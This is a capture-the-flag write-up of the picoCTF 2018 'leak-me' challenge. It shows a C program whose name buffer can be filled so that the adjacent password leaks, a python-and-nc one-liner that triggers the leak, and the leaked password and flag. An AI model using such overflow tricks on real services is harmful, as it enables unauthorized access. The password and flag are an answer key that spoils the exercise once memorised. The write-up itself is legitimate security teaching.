# leak-me
## Question
>Can you authenticate to this [service](files/auth) and get the flag? Connect with `nc 2018shell.picoctf.com 1271`. [Source](files/auth.c).

## Hints
>Are all the system calls being used safely?

>Some people can have reallllllly long names you know..

# Solution
As we are only provided with a socket access and not the standard shell, we will have very limited capabilities in terms of commands. Let's see what it looks like:
~~~~
$ nc 2018shell.picoctf.com 1271
What is your name?
whatever
Hello whatever,
Please Enter the Password.
idonthave one
Incorrect Password!
~~~~

OK, so we are prompted for a name, it says `Hello` with whatever name has been provided, and then a password. As we don't know the password, it fails with an error message. Now, let's look at the code. Below is the interesting part of the `main` function:

```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  // ...
  // [SNIP]
  // ...
```

A buffer of 256 characters is created for the username, but interestingly, the program searches for the end of our string, to replace it with a `NULL` character. If we provide a string that is longer than what the buffer allows, the end of string won't be found and the `fgets` function should return the password instead of our name.

Let's put that into practice. We'll overflow the buffer with a 257 bytes string for our name:
~~~~
$ python -c "print('A'*257)" | nc 2018shell.picoctf.com 1271
What is your name?
Hello AAAA[SNIP]AAAAA,a_reAllY_s3cuRe_p4s$word_f78570

Incorrect Password!
~~~~

OK, now that we have the password, let's connect again:
~~~~
$ nc 2018shell.picoctf.com 1271
What is your name?
whatever
Hello whatever,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_f78570
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_958ebb8e}
~~~~

# Flag
`picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_958ebb8e}`
